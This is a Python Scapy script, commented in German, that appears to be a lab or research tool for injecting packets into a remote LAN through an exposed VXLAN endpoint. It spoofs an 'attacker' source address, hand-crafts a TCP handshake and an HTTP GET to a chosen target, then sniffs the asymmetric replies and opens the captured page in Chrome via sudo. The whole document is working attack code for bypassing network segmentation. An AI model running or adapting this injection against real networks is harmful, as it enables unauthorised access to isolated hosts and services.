#!/usr/bin/env python

"""
Usage:
./http_asym.py IP Port debug 

./http_asym.py 10.0.0.10 80 debug

 """
from scapy.all import *
from scapy.layers.http import *
from scapy.layers import http
import random
import sys
import threading
from threading import Thread
import time
import webbrowser
import os


### Variabeln definieren

vtep_dst = "192.168.10.149"
vtep_src = "172.20.10.254" #Hier muss eine IP aus meinem Subnetz stehen, sonst verwirft der erste Hop das Paket!
vxlanport = 4789
vx_vnid = 1
mac_src = "be:fb:ef:be:fb:ef"
mac_dst = "ea:e4:59:b5:42:03" #"ff:ff:ff:ff:ff:ff"
attacker_ip = "172.20.10.10"
http_port = int(sys.argv[2])
dest = sys.argv[1]
s_port = random.randint(20000,65500)

# TCP-Flags definieren
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80


### Check if debug is enabled
if len(sys.argv) > 3:
    debug = 1
else:
    debug = 0


### VXLAN Paket: Hierueber werden Ethernet Frames ins LAN eingefuert
VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)

### syn_ack_do ist die Funktion, die beim sniffen des SYN/ACK Pakets ausgefuehrt wird
# Fuer das folgenden ACK Paket sind folende Parameter wichtig: Dst_Port, ACK#, SEQ#
def syn_ack_do(packet):
    #print(packet.summary())
    #print(packet[TCP].dport)
    global syn_ack_dport
    syn_ack_dport = packet[TCP].dport
    global syn_ack_ack
    syn_ack_ack = packet[TCP].ack
    global syn_ack_seq
    syn_ack_seq = packet[TCP].seq
    if debug:
        print("############## SYN/ACK packet received ##############")
        print("dport = " + str(syn_ack_dport))
        print("ACK# = " + str(syn_ack_ack))
        print("SEQ# = " + str(syn_ack_seq))
        print("")
    return

#$$$$$ SEND SYN
syn = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(sport=s_port, dport=http_port, flags='S')
send(syn, verbose=0)
if debug:
        print("############## SYN packet sent #####################")
        print("dport von SYN = " + str(http_port))
        print("Source IP Address = " + str(attacker_ip))
        print("Destination IP Address = " + str(dest))
        print("")

#$$$$$ GET SYNACK : TCP flags SYN and ACK are set
sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & SYN, prn=syn_ack_do, count = 1)

#$$$$$ SEND ACK
ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='A')
out_ack = send(ack, verbose=0)
if debug:
        print("############## ACK packet sent #####################")
        print("srcport = " + str(syn_ack_dport)) 
        print("ACK# = " + str(syn_ack_seq + 1))
        print("SEQ# = " + str(syn_ack_ack))
        print("")


### Thread Klasse initiieren fuer den Sniffer von HTTPResponse
# bei run() wird  sniff_http_response_thread() ausgefuehrt
class myThread (threading.Thread):
   def __init__(self):
      threading.Thread.__init__(self)
   def run(self):
      sniff_http_response_thread()


### Sniff Funktion fuer sniff_http_response_thread
def get_http_packet(packet):
        if debug:
            print("############## HTTP Response received ###################")
            print("TCP ACK =  " + str(packet.getlayer(TCP).ack))
            print("TCP SEQ =  " + str(packet.getlayer(TCP).seq))
            print("HTTP Layer vorhanden? : " + str(packet.haslayer(HTTPResponse)))
            print("Source IP =  " + str(packet.getlayer(IP).src))
            print("")

        if packet.haslayer(HTTPResponse) is True:
            print("############## Header ###################")
            print("")
            header_str = str(packet.getlayer(HTTPResponse)[0:len(packet.getlayer(HTTPResponse))])
            left_text = header_str.partition("<!")[0]
            print(left_text)
            print""
            print("############## Body ###################")
            try:
                http_response_body = str(packet.getlayer(Raw).load)
                print http_response_body
            except:
                print("Error line 130")
                return      


            ### Oeffne Google Chrome mit der Website
            f = open("website.html", "w")
            f.write(http_response_body)
            f.close()
            new = 2
            url = "/home/ben/http_request/website.html"
            os.system('sudo -u ben google-chrome-stable /home/ben/http_request/website.html')

        else:
            print("Keine HTTP Layer vorhanden")
        print("")
        return

### NEUE Sniff Funktion fuer sniff_http_response_thread
http_content = ""
def get_http_packet1(packet):
    #print("\r\n\r\n\r\n######### Paket ist eingetroffen! #########")
    #print(packet.summary())
    if packet.haslayer(HTTPResponse) is True:
        global http_status
        http_status = str(packet.getlayer(HTTPResponse).Http_Version) + " " + str(packet.getlayer(HTTPResponse).Status_Code) + " " + str(packet.getlayer(HTTPResponse).Reason_Phrase) 
        #print("\r\nPacket has layer HTTPResponse")
        #ls(packet.getlayer(HTTPResponse))
    #if packet.haslayer(HTTP) is True:
    #    print("\r\nPacket has layer HTTP")
    #    ls(packet.getlayer(HTTP))
    if packet.haslayer(Raw) is True:
        global http_content
        http_content += str(packet.getlayer(Raw).load)
        #print("\r\nPacket has layer Raw")
        #print("\r\n" + packet.getlayer(Raw).load)



### Sniff Funktion um HTTPResponse zu finden
# Sie filtert auf TCP Pakete mit der ACK Nummer 58. Der Request hast eine Laenge von 57. Die Ack Nummer ist Length + 1
def sniff_http_response_thread():
    #sniff(filter = "tcp port " + str(http_port) + " and tcp[11] == 58 and tcp[13] == 24 and greater 100", prn=get_http_packet, count = 1)  # + " and tcp[tcpflags] & tcp-ack == 58"
    sniff(session=TCPSession, filter = "tcp port 80", prn=get_http_packet1, store=False, count = 5)
    print(http_status)
    print("")
    print(http_content)
        ### Oeffne Google Chrome mit der Website
    f = open("website.html", "w")
    f.write(http_content)  ### http_content umfasst noch die Header. müssen noch weg
    f.close()
    new = 2
    url = "/home/ben/http_request/website.html"
    os.system('sudo -u ben google-chrome-stable /home/ben/http_request/website.html')
    return

# Sniffer als Thread initiieren und starten, damit waehrend der Request losgeschickt wird
# auch sehr schnelle Responses eingefangen werden koennen
sniffer = myThread()
sniffer.start()
time.sleep(1) #Sniffer braucht ein wenig Zeit zum wach werden

### HTTP GET Paket 
# Hier wurd durch ein Argument des Skripts die Destination Address mitgtgeben. Accept-Encoding ist 8bit, damit nicht codiert wird.
getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'

#$$$$$ SEND HTTP Request
http_request = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr
send(http_request, verbose=0)
if debug:
        print("############## HTTP Request sent #####################")
        print("srcport = " + str(syn_ack_dport)) 
        print("ACK# = " + str(syn_ack_seq + 1))
        print("SEQ# = " + str(syn_ack_ack))
        print("")










